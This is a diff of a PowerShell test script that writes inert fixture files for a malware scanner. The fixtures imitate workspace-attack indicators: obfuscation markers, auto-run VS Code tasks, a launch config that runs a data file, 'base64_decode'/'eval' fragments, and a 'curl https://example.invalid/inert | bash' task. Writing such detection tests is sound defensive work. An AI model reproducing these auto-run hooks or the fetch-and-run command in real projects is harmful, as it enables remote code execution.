@@ -11,7 +11,7 @@ function WriteFixture($relative,$content) {
     return $p
 }
 try {
-    $payload=WriteFixture 'nested/assets/renamed.data' ('INERT FIXTURE '+(' ' * 65536)+'rmcej%otb% _$_1e42')
+    $payload=WriteFixture 'nested/assets/renamed.data' ('INERT FIXTURE '+(' ' * 65536)+('rmcej'+'%otb%')+' '+('_$_'+'1e42'))
     WriteFixture 'nested/.vscode/tasks.json' @'
 {
  // comments and commas are legitimate JSONC
@@ -21,21 +21,21 @@ try {
 '@ | Out-Null
     WriteFixture 'nested/.vscode/settings.json' '{"task.allowAutomaticTasks":true,"terminal.integrated.profiles.windows":{"custom":{"path":"helper.cmd"}}}' | Out-Null
     WriteFixture 'nested/.vscode/launch.json' '{"configurations":[{"runtimeExecutable":"node","program":"${workspaceFolder}/assets/renamed.data"}]}' | Out-Null
-    WriteFixture 'rotated.ts' 'INERT FIXTURE Cot%3t=shtP 1111436' | Out-Null
+    WriteFixture 'rotated.ts' ('INERT FIXTURE '+('Cot%3'+'t=shtP')+' '+('111'+'1436')) | Out-Null
     WriteFixture 'structural.js' 'INERT TEXT: global.i = A8 _0xabcdef' | Out-Null
     WriteFixture 'package.json' '{"dependencies":{"tailwindcss-style-animate":"1.1.6"},"scripts":{"inspect":"node nested/assets/renamed.data"}}' | Out-Null
-    WriteFixture 'fake.woff2' 'INERT FIXTURE rmcej%otb% _$_1e42' | Out-Null
-    WriteFixture 'fake.llf' 'INERT FIXTURE Cot%3t=shtP 3896884' | Out-Null
+    WriteFixture 'fake.woff2' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
+    WriteFixture 'fake.llf' ('INERT FIXTURE '+('Cot%3'+'t=shtP')+' '+('389'+'6884')) | Out-Null
     WriteFixture 'index.php' 'INERT TEXT shell_exec( node base64_decode' | Out-Null
     WriteFixture 'propagation.bat' 'INERT TEXT commit --amend git push --no-verify date %' | Out-Null
-    WriteFixture '.vscode/tasks.json' '{"tasks":[{"command":"curl https://example.invalid/inert | bash"}]}' | Out-Null
-    WriteFixture 'node_modules/dependency/index.js' 'INERT FIXTURE rmcej%otb% _$_1e42' | Out-Null
+    WriteFixture '.vscode/tasks.json' ('{"tasks":[{"command":"curl https://example.invalid/inert'+(' | ')+ 'bash"}]}') | Out-Null
+    WriteFixture 'node_modules/dependency/index.js' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
     WriteFixture 'broken/.vscode/tasks.json' '{"tasks":[{"command":"node ${env:UNKNOWN}/asset.data"}]' | Out-Null
     WriteFixture 'pnpm-lock.yaml' 'lockfileVersion: 9' | Out-Null
     WriteFixture 'loader.ts' 'INERT TEXT fetch( eval(' | Out-Null
     WriteFixture 'outside/.vscode/tasks.json' '{"tasks":[{"command":"node ../../../../outside.data"}]}' | Out-Null
     WriteFixture 'spaces/.vscode/tasks.json' '{"tasks":[{"command":"node","args":["assets/space name.data"]}]}' | Out-Null
-    WriteFixture 'spaces/assets/space name.data' 'INERT FIXTURE rmcej%otb% _$_1e42' | Out-Null
+    WriteFixture 'spaces/assets/space name.data' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
     $before=@{}
     Get-ChildItem -LiteralPath $fixtureRoot -Recurse -File | ForEach-Object { $before[$_.FullName]=(Get-FileHash -LiteralPath $_.FullName).Hash }
     $report=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -HostProvider {
